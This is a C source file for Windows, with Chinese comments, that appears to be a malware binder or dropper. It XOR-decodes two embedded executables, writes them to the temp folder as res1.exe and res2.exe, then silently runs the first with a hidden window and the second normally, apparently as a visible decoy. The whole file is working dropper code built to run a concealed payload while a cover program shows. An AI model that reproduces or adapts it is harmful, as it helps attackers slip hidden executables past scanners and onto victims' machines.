
#include <windows.h>
#include <stdio.h>
#include "res1.h"
#include "res2.h"

#define RES1 RES_1111
#define RES2 RES_2222

#define RESLEN1 RES_1111_LEN
#define RESLEN2 RES_2222_LEN

#define KEY1 RES_1111_KEY
#define KEY2 RES_2222_KEY


char* write_resource(u_char* data, const char* name, DWORD dwSize){
    HANDLE hFile;
    HANDLE hTempFile;
    DWORD  dwBufWritedSize, dwBufSize = 255;
    char szTempName[255];
    char* szPath = (char*)malloc(255);
    char lpPathBuffer[255];

    // 获取临时文件路径
    GetTempPathA(dwBufSize, lpPathBuffer);

    //创建临时文件
    GetTempFileNameA(lpPathBuffer,  // 临时文件目录
        (LPCSTR)"tmp",              // 临时文件的前缀
        0,                          // 创建唯一的名字
        szTempName);                // 保存名字的缓冲

    hTempFile = CreateFile((LPTSTR)szTempName,      // 文件名
        GENERIC_READ | GENERIC_WRITE,               // 用于读写操作
        0,                                          // 不共享
        NULL,                                       // 默认安全属性
        CREATE_ALWAYS,                              // 可重写已有文件
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hTempFile == INVALID_HANDLE_VALUE)
    {
        // MessageBoxA(NULL, "Could not create temporary file.", "Error", MB_OK);
        return NULL;
    }

    WriteFile(hTempFile, data, dwSize, &dwBufWritedSize, NULL);
    //关闭文件
    CloseHandle(hTempFile);

    sprintf_s(szPath, 255, "%s\\%s", lpPathBuffer, name);
    if (!MoveFileExA(szTempName, szPath, MOVEFILE_REPLACE_EXISTING)){
        // MessageBoxA(NULL, "Could not move temporary file.", "Error", MB_OK);
        return NULL;
    }
    return szPath;
}

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR    lpCmdLine,
                     int       nCmdShow)
{

    for(int i = 0; i < RESLEN1; i++){
        RES1[i] = RES1[i] ^ KEY1;
    }

    for(int i = 0; i < RESLEN2; i++){
        RES2[i] = RES2[i] ^ KEY2;
    }

    char* res1_path = write_resource(RES1, "res1.exe", RESLEN1);
    char* res2_path = write_resource(RES2, "res2.exe", RESLEN2);

    // MessageBoxA(NULL, wrp, "提示", MB_OK);
    if (res1_path){
        STARTUPINFO si = {sizeof(si)};
        PROCESS_INFORMATION pi;
        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        si.wShowWindow = SW_HIDE;

        BOOL bRet = CreateProcess (
            NULL,   // 不在此指定可执行文件的文件名
            res1_path,    // 命令行参数
            NULL,   // 默认进程安全性
            NULL,   // 默认进程安全性
            FALSE,  // 指定当前进程内句柄不可以被子进程继承
            NULL,   // 为新进程创建一个新的控制台窗口
            NULL,   // 使用本进程的环境变量
            NULL,   // 使用本进程的驱动器和目录
            &si,
            &pi);
        if(bRet)
        {
            // 不使用的句柄最好关掉
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            // printf("[+] sub process id: %d\n", pi.dwProcessId);
        }
    }

    if (res2_path){
        // MessageBoxA(NULL, "res2 start!", "提示", MB_OK);
        STARTUPINFO si2 = {sizeof(si2)};
        PROCESS_INFORMATION pi2;
        si2.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        si2.wShowWindow = nCmdShow;

        BOOL bRet2 = CreateProcess (
            NULL,       // 不在此指定可执行文件的文件名
            res2_path,  // 命令行参数
            NULL,   // 默认进程安全性
            NULL,   // 默认进程安全性
            FALSE,  // 指定当前进程内句柄不可以被子进程继承
            NULL,   // 为新进程创建一个新的控制台窗口
            NULL,   // 使用本进程的环境变量
            NULL,   // 使用本进程的驱动器和目录
            &si2,
            &pi2);
        if(bRet2)
        {
            // 不使用的句柄最好关掉
            CloseHandle(pi2.hThread);
            CloseHandle(pi2.hProcess);
            // printf("[+] sub process id: %d\n", pi.dwProcessId);
        }
    }
    return 0;
}
